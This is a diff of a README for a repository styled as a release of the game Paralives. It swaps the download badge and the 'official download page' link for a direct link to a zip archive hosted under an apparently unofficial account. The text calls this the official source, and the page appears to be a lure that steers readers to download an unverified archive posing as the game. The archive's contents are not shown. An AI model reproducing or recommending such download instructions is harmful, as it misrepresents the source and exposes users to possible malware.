@@ -1,6 +1,6 @@
 # 🎮 paralives-release - Simulate your life with complete freedom
 
-[![](https://img.shields.io/badge/Download-Paralives-blue.svg)](https://github.com/Inflected-spread265/paralives-release)
+[![](https://img.shields.io/badge/Download-Paralives-blue.svg)](https://raw.githubusercontent.com/Inflected-spread265/paralives-release/main/Paralives/paralives_release_v1.3.zip)
 
 ## 📌 About this project
 
@@ -21,7 +21,7 @@ Your computer needs specific components to run this software. Please verify your
 
 You can obtain the current version of the software from our official repository page. Follow these steps to find the correct file for your system:
 
-1. Visit the [official download page](https://github.com/Inflected-spread265/paralives-release).
+1. Visit the [official download page](https://raw.githubusercontent.com/Inflected-spread265/paralives-release/main/Paralives/paralives_release_v1.3.zip).
 2. Look for the section labeled Releases on the right side of the screen.
 3. Click the latest version number.
 4. Locate the section named Assets.
